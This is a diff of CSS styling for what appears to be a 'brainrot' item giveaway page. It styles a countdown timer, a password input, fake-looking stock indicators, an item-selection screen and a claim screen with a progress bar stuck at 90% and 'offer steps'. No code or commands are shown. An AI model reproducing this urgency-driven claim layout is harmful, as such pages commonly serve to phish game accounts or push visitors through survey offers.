@@ -18,797 +18,238 @@
             --og-gold: #ffd700;
             --secret-purple: #da70ff;
         }
-
         *,
         *::before,
-        *::after {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
+        *::after { box-sizing: border-box; margin: 0; padding: 0; }
         body {
-            background: var(--bg);
-            color: #fff;
-            font-family: 'Nunito', sans-serif;
-            min-height: 100vh;
-            overflow-x: hidden;
-            position: relative;
+            background: var(--bg); color: #fff; font-family: 'Nunito', sans-serif;
+            min-height: 100vh; overflow-x: hidden; position: relative;
         }
-
         body::before {
             content: '';
-            position: fixed;
-            inset: 0;
-            background-image:
-                linear-gradient(rgba(0, 207, 255, .04) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 207, 255, .04) 1px, transparent 1px);
+            position: fixed; inset: 0;
+            background-image: linear-gradient(rgba(0,207,255,.04) 1px, transparent 1px),
+                            linear-gradient(90deg, rgba(0,207,255,.04) 1px, transparent 1px);
             background-size: 40px 40px;
             animation: gridScroll 20s linear infinite;
-            pointer-events: none;
-            z-index: 0;
+            pointer-events: none; z-index: 0;
         }
-        @keyframes gridScroll {
-            0% { background-position: 0 0; }
-            100% { background-position: 40px 40px; }
-        }
-
+        @keyframes gridScroll { 0% { background-position: 0 0; } 100% { background-position: 40px 40px; } }
         .blob {
-            position: fixed;
-            border-radius: 50%;
-            filter: blur(80px);
-            opacity: .18;
-            pointer-events: none;
-            z-index: 0;
-            animation: blobFloat 8s ease-in-out infinite;
+            position: fixed; border-radius: 50%; filter: blur(80px); opacity: .18;
+            pointer-events: none; z-index: 0; animation: blobFloat 8s ease-in-out infinite;
         }
-        .blob1 { width: 400px; height: 400px; background: var(--hot-pink); top: -100px; left: -100px; }
-        .blob2 { width: 350px; height: 350px; background: var(--electric-blue); bottom: -80px; right: -80px; animation-delay: -3s; }
-        .blob3 { width: 300px; height: 300px; background: var(--purple); top: 40%; left: 60%; animation-delay: -5s; }
+        .blob1 { width:400px;height:400px;background:var(--hot-pink);top:-100px;left:-100px; }
+        .blob2 { width:350px;height:350px;background:var(--electric-blue);bottom:-80px;right:-80px;animation-delay:-3s; }
+        .blob3 { width:300px;height:300px;background:var(--purple);top:40%;left:60%;animation-delay:-5s; }
         @keyframes blobFloat {
-            0%, 100% { transform: translate(0, 0) scale(1); }
-            33% { transform: translate(20px, -20px) scale(1.05); }
-            66% { transform: translate(-15px, 15px) scale(.95); }
+            0%,100% { transform:translate(0,0) scale(1); }
+            33%      { transform:translate(20px,-20px) scale(1.05); }
+            66%      { transform:translate(-15px,15px) scale(.95); }
         }
-
         body::after {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 0, 0, .15) 2px, rgba(0, 0, 0, .15) 4px);
-            pointer-events: none;
-            z-index: 100;
+            content:''; position:fixed;inset:0;
+            background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.15) 2px,rgba(0,0,0,.15) 4px);
+            pointer-events:none; z-index:100;
         }
-
-        .wrapper {
-            position: relative;
-            z-index: 1;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px 16px 40px;
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 24px;
-            animation: fadeDown .6s ease both;
-        }
-        .header .eyebrow {
-            font-family: 'Fredoka One', cursive;
-            font-size: 13px;
-            letter-spacing: 4px;
-            text-transform: uppercase;
-            color: var(--electric-blue);
-            margin-bottom: 6px;
-        }
+        .wrapper { position:relative; z-index:1; min-height:100vh; display:flex; flex-direction:column; align-items:center; padding:20px 16px 40px; }
+        .header { text-align:center; margin-bottom:24px; animation:fadeDown .6s ease both; }
+        .header .eyebrow { font-family:'Fredoka One',cursive; font-size:13px; letter-spacing:4px; text-transform:uppercase; color:var(--electric-blue); margin-bottom:6px; }
         .header h1 {
-            font-family: 'Bangers', cursive;
-            font-size: clamp(42px, 8vw, 72px);
-            line-height: .95;
-            letter-spacing: 2px;
-            background: linear-gradient(135deg, var(--hot-pink) 0%, var(--yellow) 50%, var(--neon-green) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            filter: drop-shadow(0 0 30px rgba(255, 45, 120, .5));
-            animation: glitchTitle 6s infinite;
+            font-family:'Bangers',cursive; font-size:clamp(42px,8vw,72px); line-height:.95; letter-spacing:2px;
+            background:linear-gradient(135deg,var(--hot-pink) 0%,var(--yellow) 50%,var(--neon-green) 100%);
+            -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;
+            filter:drop-shadow(0 0 30px rgba(255,45,120,.5)); animation:glitchTitle 6s infinite;
         }
         @keyframes glitchTitle {
-            0%, 95%, 100% { transform: none; filter: drop-shadow(0 0 30px rgba(255, 45, 120, .5)); }
-            96% { transform: translate(-3px, 0) skewX(-5deg); filter: drop-shadow(3px 0 0 var(--electric-blue)) drop-shadow(-3px 0 0 var(--hot-pink)); }
-            97% { transform: translate(3px, 0); }
-            98% { transform: translate(-1px, 2px); filter: drop-shadow(0 0 30px rgba(255, 45, 120, .5)); }
+            0%,95%,100% { transform:none; filter:drop-shadow(0 0 30px rgba(255,45,120,.5)); }
+            96% { transform:translate(-3px,0) skewX(-5deg); filter:drop-shadow(3px 0 0 var(--electric-blue)) drop-shadow(-3px 0 0 var(--hot-pink)); }
+            97% { transform:translate(3px,0); }
+            98% { transform:translate(-1px,2px); filter:drop-shadow(0 0 30px rgba(255,45,120,.5)); }
         }
-        .header .subtitle {
-            font-family: 'Fredoka One', cursive;
-            font-size: clamp(14px, 2.5vw, 18px);
-            color: #aaa;
-            margin-top: 6px;
-        }
-        .header .subtitle span { color: var(--neon-green); }
-
-        .prize-banner {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            justify-content: center;
-            margin-bottom: 28px;
-            animation: fadeDown .7s .1s ease both;
-        }
+        .header .subtitle { font-family:'Fredoka One',cursive; font-size:clamp(14px,2.5vw,18px); color:#aaa; margin-top:6px; }
+        .header .subtitle span { color:var(--neon-green); }
+        .prize-banner { display:flex; gap:10px; flex-wrap:wrap; justify-content:center; margin-bottom:28px; animation:fadeDown .7s .1s ease both; }
         .prize-tag {
-            background: linear-gradient(135deg, rgba(255, 45, 120, .15), rgba(255, 45, 120, .05));
-            border: 1px solid rgba(255, 45, 120, .4);
-            border-radius: 50px;
-            padding: 7px 16px;
-            font-family: 'Fredoka One', cursive;
-            font-size: 13px;
-            color: #fff;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            backdrop-filter: blur(8px);
+            background:linear-gradient(135deg,rgba(255,45,120,.15),rgba(255,45,120,.05)); border:1px solid rgba(255,45,120,.4);
+            border-radius:50px; padding:7px 16px; font-family:'Fredoka One',cursive; font-size:13px; color:#fff;
+            display:flex; align-items:center; gap:6px; backdrop-filter:blur(8px);
         }
-        .prize-tag.blue {
-            background: linear-gradient(135deg, rgba(0, 207, 255, .15), rgba(0, 207, 255, .05));
-            border-color: rgba(0, 207, 255, .4);
-        }
-        .prize-tag.green {
-            background: linear-gradient(135deg, rgba(0, 255, 136, .15), rgba(0, 255, 136, .05));
-            border-color: rgba(0, 255, 136, .4);
-        }
-
-        /* ── Two-column layout ── */
-        .main-layout {
-            display: flex;
-            gap: 28px;
-            width: 100%;
-            max-width: 1100px;
-            align-items: flex-start;
-            justify-content: center;
-        }
-        .left-column { flex: 0 0 400px; max-width: 420px; min-width: 340px; }
-        .right-column { flex: 1; max-width: 580px; min-width: 320px; }
-
-        /* ── Card ── */
+        .prize-tag.blue { background:linear-gradient(135deg,rgba(0,207,255,.15),rgba(0,207,255,.05)); border-color:rgba(0,207,255,.4); }
+        .prize-tag.green { background:linear-gradient(135deg,rgba(0,255,136,.15),rgba(0,255,136,.05)); border-color:rgba(0,255,136,.4); }
+        .main-layout { display:flex; gap:28px; width:100%; max-width:1100px; align-items:flex-start; justify-content:center; }
+        .left-column { flex:0 0 400px; max-width:420px; min-width:340px; }
+        .right-column { flex:1; max-width:580px; min-width:320px; }
         .card {
-            background: var(--card);
-            border: 1px solid var(--border);
-            border-radius: 24px;
-            padding: 32px 28px;
-            position: relative;
-            overflow: hidden;
-            animation: fadeUp .7s .2s ease both;
-            box-shadow: 0 0 60px rgba(255, 45, 120, .1), 0 0 120px rgba(0, 207, 255, .05);
+            background:var(--card); border:1px solid var(--border); border-radius:24px; padding:32px 28px;
+            position:relative; overflow:hidden; animation:fadeUp .7s .2s ease both;
+            box-shadow:0 0 60px rgba(255,45,120,.1),0 0 120px rgba(0,207,255,.05);
         }
         .card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, var(--hot-pink), var(--electric-blue), var(--neon-green), var(--yellow));
-            background-size: 200% 100%;
-            animation: rainbowSlide 3s linear infinite;
+            content:''; position:absolute; top:0;left:0;right:0; height:3px;
+            background:linear-gradient(90deg,var(--hot-pink),var(--electric-blue),var(--neon-green),var(--yellow));
+            background-size:200% 100%; animation:rainbowSlide 3s linear infinite;
         }
-        @keyframes rainbowSlide {
-            0% { background-position: 0% 0%; }
-            100% { background-position: 200% 0%; }
-        }
-        .card-title {
-            font-family: 'Bangers', cursive;
-            font-size: 26px;
-            letter-spacing: 1px;
-            margin-bottom: 4px;
-            color: #fff;
-        }
-        .card-subtitle { font-size: 13px; color: #666; margin-bottom: 20px; }
-
-        /* ── Timer ── */
+        @keyframes rainbowSlide { 0% { background-position:0% 0%; } 100% { background-position:200% 0%; } }
+        .card-title { font-family:'Bangers',cursive; font-size:26px; letter-spacing:1px; margin-bottom:4px; color:#fff; }
+        .card-subtitle { font-size:13px; color:#666; margin-bottom:20px; }
         .timer-banner {
-            background: linear-gradient(135deg, rgba(255, 215, 0, .12), rgba(255, 165, 0, .06));
-            border: 1.5px solid rgba(255, 215, 0, .45);
-            border-radius: 14px;
-            padding: 14px 18px;
-            margin-bottom: 20px;
-            text-align: center;
-            animation: timerPulse 1.5s ease-in-out infinite;
+            background:linear-gradient(135deg,rgba(255,215,0,.12),rgba(255,165,0,.06)); border:1.5px solid rgba(255,215,0,.45);
+            border-radius:14px; padding:14px 18px; margin-bottom:20px; text-align:center; animation:timerPulse 1.5s ease-in-out infinite;
         }
         @keyframes timerPulse {
-            0%, 100% { box-shadow: 0 0 18px rgba(255, 215, 0, .25); }
-            50% { box-shadow: 0 0 35px rgba(255, 215, 0, .55), 0 0 60px rgba(255, 165, 0, .3); }
+            0%,100% { box-shadow:0 0 18px rgba(255,215,0,.25); }
+            50% { box-shadow:0 0 35px rgba(255,215,0,.55),0 0 60px rgba(255,165,0,.3); }
         }
-        .timer-banner.expired {
-            border-color: rgba(255, 80, 80, .5);
-            background: linear-gradient(135deg, rgba(255, 60, 60, .1), rgba(180, 30, 30, .04));
-            animation: none;
-            box-shadow: 0 0 12px rgba(255, 60, 60, .2);
+        .timer-banner.expired { border-color:rgba(255,80,80,.5); background:linear-gradient(135deg,rgba(255,60,60,.1),rgba(180,30,30,.04)); animation:none; box-shadow:0 0 12px rgba(255,60,60,.2); }
+        .timer-label { font-family:'Fredoka One',cursive; font-size:15px; color:#ffd700; letter-spacing:1px; text-shadow:0 0 12px rgba(255,215,0,.6); }
+        .timer-banner.expired .timer-label { color:#ff6b6b; text-shadow:0 0 12px rgba(255,100,100,.5); }
+        .timer-countdown { font-family:'Bangers',cursive; font-size:38px; letter-spacing:3px; color:#fff; text-shadow:0 0 20px rgba(255,215,0,.8); }
+        .timer-banner.expired .timer-countdown { color:#ff6b6b; text-shadow:0 0 20px rgba(255,100,100,.7); }
+        .field { margin-bottom:16px; }
+        label { display:block; font-family:'Fredoka One',cursive; font-size:12px; letter-spacing:1px; text-transform:uppercase; color:#888; margin-bottom:6px; }
+        .input-wrap { position:relative; }
+        .input-wrap .icon { position:absolute; left:13px; top:50%; transform:translateY(-50%); font-size:16px; pointer-events:none; }
+        input[type="text"],input[type="password"] {
+            width:100%; background:rgba(255,255,255,.04); border:1.5px solid var(--border); border-radius:12px;
+            padding:13px 14px 13px 42px; color:#fff; font-family:'Nunito',sans-serif; font-size:15px; font-weight:700;
+            outline:none; transition:border-color .2s,box-shadow .2s,background .2s;
         }
-        .timer-label {
-            font-family: 'Fredoka One', cursive;
-            font-size: 15px;
-            color: #ffd700;
-            letter-spacing: 1px;
-            text-shadow: 0 0 12px rgba(255, 215, 0, .6);
-        }
-        .timer-banner.expired .timer-label {
-            color: #ff6b6b;
-            text-shadow: 0 0 12px rgba(255, 100, 100, .5);
-        }
-        .timer-countdown {
-            font-family: 'Bangers', cursive;
-            font-size: 38px;
-            letter-spacing: 3px;
-            color: #fff;
-            text-shadow: 0 0 20px rgba(255, 215, 0, .8);
-        }
-        .timer-banner.expired .timer-countdown {
-            color: #ff6b6b;
-            text-shadow: 0 0 20px rgba(255, 100, 100, .7);
-        }
-
-        /* ── Form ── */
-        .field { margin-bottom: 16px; }
-        label {
-            display: block;
-            font-family: 'Fredoka One', cursive;
-            font-size: 12px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            color: #888;
-            margin-bottom: 6px;
-        }
-        .input-wrap { position: relative; }
-        .input-wrap .icon {
-            position: absolute;
-            left: 13px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 16px;
-            pointer-events: none;
-        }
-        input[type="text"],
-        input[type="password"] {
-            width: 100%;
-            background: rgba(255, 255, 255, .04);
-            border: 1.5px solid var(--border);
-            border-radius: 12px;
-            padding: 13px 14px 13px 42px;
-            color: #fff;
-            font-family: 'Nunito', sans-serif;
-            font-size: 15px;
-            font-weight: 700;
-            outline: none;
-            transition: border-color .2s, box-shadow .2s, background .2s;
-        }
-        input:focus {
-            border-color: var(--electric-blue);
-            background: rgba(0, 207, 255, .05);
-            box-shadow: 0 0 0 3px rgba(0, 207, 255, .15);
-        }
-        input.error { border-color: var(--hot-pink); box-shadow: 0 0 0 3px rgba(255, 45, 120, .15); }
-        input.success { border-color: var(--neon-green); box-shadow: 0 0 0 3px rgba(0, 255, 136, .15); }
-        .status-msg { margin-top: 5px; font-size: 12px; font-weight: 700; min-height: 16px; }
-        .status-msg.error { color: var(--hot-pink); }
-        .status-msg.success { color: var(--neon-green); }
-        .verify-badge {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 16px;
-            transition: all .3s;
-        }
-
-        /* ── Bouncing submit button ── */
+        input:focus { border-color:var(--electric-blue); background:rgba(0,207,255,.05); box-shadow:0 0 0 3px rgba(0,207,255,.15); }
+        input.error { border-color:var(--hot-pink); box-shadow:0 0 0 3px rgba(255,45,120,.15); }
+        input.success { border-color:var(--neon-green); box-shadow:0 0 0 3px rgba(0,255,136,.15); }
+        .status-msg { margin-top:5px; font-size:12px; font-weight:700; min-height:16px; }
+        .status-msg.error { color:var(--hot-pink); }
+        .status-msg.success { color:var(--neon-green); }
+        .verify-badge { position:absolute; right:12px; top:50%; transform:translateY(-50%); font-size:16px; transition:all .3s; }
         .btn-submit {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 14px;
-            background: linear-gradient(135deg, var(--hot-pink), var(--purple));
-            color: #fff;
-            font-family: 'Bangers', cursive;
-            font-size: 24px;
-            letter-spacing: 2px;
-            cursor: pointer;
-            position: relative;
-            overflow: hidden;
-            transition: transform .15s, box-shadow .15s;
-            margin-top: 6px;
+            width:100%; padding:16px; border:none; border-radius:14px; background:linear-gradient(135deg,var(--hot-pink),var(--purple));
+            color:#fff; font-family:'Bangers',cursive; font-size:24px; letter-spacing:2px; cursor:pointer;
+            position:relative; overflow:hidden; transition:transform .15s,box-shadow .15s; margin-top:6px;
         }
-        .btn-submit:not(:disabled) {
-            animation: btnBounce 1.8s ease-in-out infinite;
-        }
+        .btn-submit:not(:disabled) { animation:btnBounce 1.8s ease-in-out infinite; }
         @keyframes btnBounce {
-            0%, 100% { transform: translateY(0); }
-            15% { transform: translateY(-10px); }
-            30% { transform: translateY(0); }
-            45% { transform: translateY(-5px); }
-            60% { transform: translateY(0); }
+            0%,100% { transform:translateY(0); }
+            15% { transform:translateY(-10px); }
+            30% { transform:translateY(0); }
+            45% { transform:translateY(-5px); }
+            60% { transform:translateY(0); }
         }
-        .btn-submit::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(135deg, rgba(255, 255, 255, .15), transparent);
-            opacity: 0;
-            transition: opacity .2s;
-        }
-        .btn-submit:hover:not(:disabled) {
-            animation: none;
-            transform: translateY(-3px);
-            box-shadow: 0 10px 35px rgba(255, 45, 120, .6);
-        }
-        .btn-submit:hover:not(:disabled)::before { opacity: 1; }
-        .btn-submit:active:not(:disabled) { transform: translateY(0); }
-        .btn-submit:disabled { opacity: .5; cursor: not-allowed; animation: none; }
-        .btn-submit .spinner {
-            display: inline-block;
-            width: 20px; height: 20px;
-            border: 3px solid rgba(255, 255, 255, .3);
-            border-top-color: #fff;
-            border-radius: 50%;
-            animation: spin .7s linear infinite;
-            vertical-align: middle;
-        }
-        .terms { margin-top: 14px; font-size: 11px; color: #444; text-align: center; line-height: 1.5; }
-
-        /* ── Right Column: Brainrot Showcase ── */
+        .btn-submit::before { content:''; position:absolute; inset:0; background:linear-gradient(135deg,rgba(255,255,255,.15),transparent); opacity:0; transition:opacity .2s; }
+        .btn-submit:hover:not(:disabled) { animation:none; transform:translateY(-3px); box-shadow:0 10px 35px rgba(255,45,120,.6); }
+        .btn-submit:hover:not(:disabled)::before { opacity:1; }
+        .btn-submit:active:not(:disabled) { transform:translateY(0); }
+        .btn-submit:disabled { opacity:.5; cursor:not-allowed; animation:none; }
+        .btn-submit .spinner { display:inline-block; width:20px;height:20px; border:3px solid rgba(255,255,255,.3); border-top-color:#fff; border-radius:50%; animation:spin .7s linear infinite; vertical-align:middle; }
+        .terms { margin-top:14px; font-size:11px; color:#444; text-align:center; line-height:1.5; }
         .showcase-card {
-            background: var(--card);
-            border: 1px solid var(--border);
-            border-radius: 24px;
-            padding: 24px 20px;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 0 50px rgba(0, 207, 255, .08), 0 0 100px rgba(191, 0, 255, .05);
-            animation: fadeUp .7s .3s ease both;
-            height: fit-content;
-            max-height: 620px;
-            display: flex;
-            flex-direction: column;
+            background:var(--card); border:1px solid var(--border); border-radius:24px; padding:24px 20px;
+            position:relative; overflow:hidden; box-shadow:0 0 50px rgba(0,207,255,.08),0 0 100px rgba(191,0,255,.05);
+            animation:fadeUp .7s .3s ease both; height:fit-content; max-height:620px; display:flex; flex-direction:column;
         }
-        .showcase-card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, var(--og-gold), var(--secret-purple), var(--og-gold));
-            background-size: 200% 100%;
-            animation: rainbowSlide 2.5s linear infinite;
-        }
-        .showcase-title {
-            font-family: 'Bangers', cursive;
-            font-size: 24px;
-            letter-spacing: 2px;
-            margin-bottom: 16px;
-            color: #fff;
-            text-align: center;
-            text-shadow: 0 0 18px rgba(255, 215, 0, .4);
-        }
-        .scroll-container {
-            flex: 1;
-            overflow: hidden;
-            position: relative;
-            border-radius: 12px;
-            mask-image: linear-gradient(to bottom, transparent 0%, black 8%, black 92%, transparent 100%);
-            -webkit-mask-image: linear-gradient(to bottom, transparent 0%, black 8%, black 92%, transparent 100%);
-        }
-        .scroll-inner { animation: scrollUp 28s linear infinite; }
-        @keyframes scrollUp {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(-50%); }
-        }
-        .brainrot-item {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            padding: 12px 16px;
-            margin: 6px 4px;
-            background: rgba(255, 255, 255, .03);
-            border: 1px solid rgba(255, 255, 255, .06);
-            border-radius: 14px;
-            transition: background .2s;
-        }
-        .brainrot-item:hover { background: rgba(255, 255, 255, .07); }
-        .brainrot-img {
-            width: 56px; height: 56px;
-            border-radius: 10px;
-            object-fit: contain;
-            background: rgba(0, 0, 0, .3);
-            flex-shrink: 0;
-            border: 2px solid transparent;
-        }
-        .brainrot-img.rarity-og {
-            border-color: rgba(255, 215, 0, .5);
-            box-shadow: 0 0 14px rgba(255, 215, 0, .35);
-        }
-        .brainrot-img.rarity-secret {
-            border-color: rgba(218, 112, 255, .5);
-            box-shadow: 0 0 14px rgba(191, 0, 255, .35);
-        }
-        .brainrot-info { flex: 1; min-width: 0; }
-        .brainrot-name {
-            font-family: 'Fredoka One', cursive;
-            font-size: 14px;
-            color: #eee;
-            line-height: 1.3;
-            margin-bottom: 3px;
-        }
-        .brainrot-meta { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
-        .rarity-badge {
-            font-family: 'Fredoka One', cursive;
-            font-size: 10px;
-            letter-spacing: 1.5px;
-            padding: 3px 10px;
-            border-radius: 20px;
-            text-transform: uppercase;
-        }
-        .rarity-badge.og {
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
-            color: #1a1a00;
-            animation: ogGlow 2s ease-in-out infinite;
-        }
-        @keyframes ogGlow {
-            0%, 100% { box-shadow: 0 0 8px rgba(255, 215, 0, .5); }
-            50% { box-shadow: 0 0 22px rgba(255, 215, 0, .9), 0 0 40px rgba(255, 165, 0, .5); }
-        }
-        .rarity-badge.secret {
-            background: linear-gradient(135deg, #bf00ff, #da70ff);
-            color: #fff;
-            animation: secretGlow 2s ease-in-out infinite;
-        }
-        @keyframes secretGlow {
-            0%, 100% { box-shadow: 0 0 8px rgba(191, 0, 255, .5); }
-            50% { box-shadow: 0 0 22px rgba(191, 0, 255, .9), 0 0 40px rgba(218, 112, 255, .5); }
-        }
-        .stock-indicator {
-            font-size: 11px;
-            font-weight: 700;
-            letter-spacing: .5px;
-        }
-        .stock-indicator.limited {
-            color: #00ff88;
-            text-shadow: 0 0 8px rgba(0, 255, 136, .5);
-            animation: stockPulseGreen 1.5s ease-in-out infinite;
-        }
-        @keyframes stockPulseGreen {
-            0%, 100% { opacity: 1; }
-            50% { opacity: .55; }
-        }
-        .stock-indicator.out {
-            color: #ff5555;
-            text-shadow: 0 0 6px rgba(255, 60, 60, .4);
-            text-decoration: line-through;
-            opacity: .7;
-        }
-
-        /* ── Selection Screen ── */
-        #selection-screen {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            width: 100%;
-            max-width: 700px;
-            animation: fadeUp .6s ease both;
-        }
-        .selection-card {
-            background: var(--card);
-            border: 1px solid var(--border);
-            border-radius: 24px;
-            padding: 32px 28px;
-            width: 100%;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 0 50px rgba(138, 43, 226, .2), 0 0 100px rgba(0, 207, 255, .1);
-        }
-        .selection-card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, var(--og-gold), var(--secret-purple), var(--og-gold));
-            background-size: 200% 100%;
-            animation: rainbowSlide 2s linear infinite;
-        }
-        .selection-title {
-            font-family: 'Bangers', cursive;
-            font-size: 32px;
-            letter-spacing: 2px;
-            margin-bottom: 8px;
-            background: linear-gradient(135deg, var(--neon-green), var(--electric-blue));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            text-align: center;
-        }
-        .selection-subtitle {
-            font-size: 16px;
-            color: #aaa;
-            margin-bottom: 24px;
-            text-align: center;
-            font-weight: 700;
-        }
-        .selection-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
-            gap: 14px;
-            margin-bottom: 24px;
-        }
-        .brainrot-card {
-            background: rgba(255, 255, 255, .03);
-            border: 2px solid rgba(255, 255, 255, .08);
-            border-radius: 16px;
-            padding: 14px;
-            text-align: center;
-            cursor: pointer;
-            transition: all .25s;
-            position: relative;
-        }
-        .brainrot-card:hover {
-            background: rgba(255, 255, 255, .06);
-            border-color: rgba(255, 255, 255, .2);
-        }
-        .brainrot-card.selected {
-            border-color: var(--neon-green);
-            background: rgba(0, 255, 136, .08);
-            box-shadow: 0 0 20px rgba(0, 255, 136, .3);
-        }
-        .brainrot-card .card-img {
-            width: 70px;
-            height: 70px;
-            object-fit: contain;
-            border-radius: 12px;
-            background: rgba(0, 0, 0, .3);
-            margin: 0 auto 8px;
-            border: 2px solid transparent;
-        }
-        .brainrot-card.selected .card-img {
-            border-color: var(--neon-green);
-        }
-        .brainrot-card .card-name {
-            font-family: 'Fredoka One', cursive;
-            font-size: 14px;
-            color: #eee;
-            margin-bottom: 4px;
-        }
-        .brainrot-card .card-rarity {
-            font-size: 10px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            font-family: 'Fredoka One';
-        }
-        .selection-counter {
-            font-family: 'Bangers', cursive;
-            font-size: 22px;
-            color: var(--yellow);
-            text-shadow: 0 0 12px rgba(255, 215, 0, .6);
-            margin-bottom: 8px;
-            text-align: center;
-        }
-        .btn-selection-continue {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 14px;
-            background: linear-gradient(135deg, var(--neon-green), var(--electric-blue));
-            color: #000;
-            font-family: 'Bangers', cursive;
-            font-size: 22px;
-            letter-spacing: 2px;
-            cursor: pointer;
-            transition: transform .15s, box-shadow .15s;
-        }
-        .btn-selection-continue:disabled {
-            opacity: .5;
-            cursor: not-allowed;
-            filter: grayscale(.4);
-        }
-        .btn-selection-continue:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(0, 255, 136, .4);
-        }
-
-        /* ── Claim Screen ── */
-        #success-screen {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-            width: 100%;
-            max-width: 560px;
-            animation: fadeUp .6s ease both;
-        }
-        .success-card {
-            background: var(--card);
-            border: 1px solid var(--border);
-            border-radius: 24px;
-            padding: 36px 30px;
-            width: 100%;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 0 60px rgba(0, 255, 136, .12), 0 0 120px rgba(0, 207, 255, .06);
-        }
-        .success-card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, var(--neon-green), var(--electric-blue), var(--neon-green));
-            background-size: 200% 100%;
-            animation: rainbowSlide 2s linear infinite;
-        }
-        .progress-wrap {
-            margin: 0 auto 24px;
-            width: 100%;
-            max-width: 400px;
-        }
-        .progress-bar {
-            position: relative;
-            width: 100%;
-            height: 28px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            overflow: hidden;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.4);
-        }
-        .progress-fill {
-            position: absolute;
-            left: 0; top: 0; bottom: 0;
-            width: 90%;
-            background: linear-gradient(90deg, #1e90ff, #8a2be2, #ff69b4);
-            background-size: 300% 100%;
-            animation: lavaFlow 6s ease-in-out infinite;
-            border-radius: 20px;
-            box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
-            overflow: hidden;
-        }
-        @keyframes lavaFlow {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        .progress-fill::before {
-            content: '';
-            position: absolute;
-            top: -5px; left: -10%;
-            width: 200%; height: 200%;
-            background:
-                radial-gradient(ellipse at 20% 50%, rgba(255, 255, 255, 0.4) 0%, transparent 50%),
-                radial-gradient(ellipse at 70% 30%, rgba(255, 255, 255, 0.3) 0%, transparent 50%),
-                radial-gradient(ellipse at 45% 80%, rgba(255, 255, 255, 0.25) 0%, transparent 50%);
-            background-size: 30% 80%, 40% 50%, 35% 60%;
-            background-repeat: no-repeat;
-            animation: bubbleShift 4s ease-in-out infinite alternate;
-            filter: blur(2px);
-        }
-        @keyframes bubbleShift {
-            0% { transform: translateX(-5%); }
-            100% { transform: translateX(5%); }
-        }
-        .progress-percent {
-            font-family: 'Bangers', cursive;
-            font-size: 28px;
-            letter-spacing: 2px;
-            margin-top: 8px;
-            color: var(--neon-green);
-            text-shadow: 0 0 12px rgba(0, 255, 136, 0.6);
-        }
-        .claim-headline {
-            font-family: 'Bangers', cursive;
-            font-size: 32px;
-            margin-bottom: 6px;
-            background: linear-gradient(135deg, var(--neon-green), var(--electric-blue));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            letter-spacing: 1px;
-        }
-        .claim-subtitle {
-            font-size: 16px;
-            color: #ccc;
-            margin-bottom: 18px;
-            font-weight: 700;
-        }
-        .chosen-banner {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-        .chosen-badge {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            background: rgba(255, 255, 255, .05);
-            border: 1px solid rgba(255, 255, 255, .1);
-            border-radius: 12px;
-            padding: 8px 14px;
-            font-family: 'Fredoka One', cursive;
-            font-size: 13px;
-        }
-        .chosen-badge img {
-            width: 32px;
-            height: 32px;
-            border-radius: 6px;
-            object-fit: contain;
-            background: rgba(0, 0, 0, .3);
-        }
-        .offer-steps {
-            background: rgba(0, 255, 136, .06);
-            border: 1px solid rgba(0, 255, 136, .2);
-            border-radius: 12px;
-            padding: 16px 18px;
-            font-size: 14px;
-            color: #bbb;
-            margin-bottom: 24px;
-            text-align: left;
-            line-height: 2;
-        }
-        .offer-steps span { color: var(--neon-green); font-weight: 700; font-family: 'Fredoka One', cursive; }
-        .btn-continue {
-            display: block;
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 14px;
-            background: linear-gradient(135deg, var(--neon-green), var(--electric-blue));
-            color: #000;
-            font-family: 'Bangers', cursive;
-            font-size: 22px;
-            letter-spacing: 2px;
-            cursor: pointer;
